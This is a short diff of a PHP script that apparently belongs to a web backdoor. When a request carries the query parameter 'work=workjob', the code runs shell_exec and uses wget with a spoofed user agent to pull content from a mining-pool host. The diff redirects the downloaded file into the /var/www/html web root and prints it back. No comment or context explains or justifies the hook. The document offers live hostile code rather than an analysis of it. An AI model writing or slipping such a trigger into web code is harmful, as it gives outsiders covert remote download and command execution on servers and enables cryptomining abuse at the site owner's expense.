@@ -3,16 +3,13 @@
 if($_GET["q"] == "")
   
 {
-
-echo "linux84";
-
 }
 
 if($_GET["work"] == "workjob")
   
 {
 
-echo shell_exec("wget -U 'Mozille84' -O ./linux84 http://mine.arionumpool.com/mine.php?q=info;cat ./linux84");
+echo shell_exec("wget -U 'Mozille84' -O /var/www/html/linux84 http://mine.arionumpool.com/mine.php?q=info;cat /var/www/html/linux84");
 
 }
 
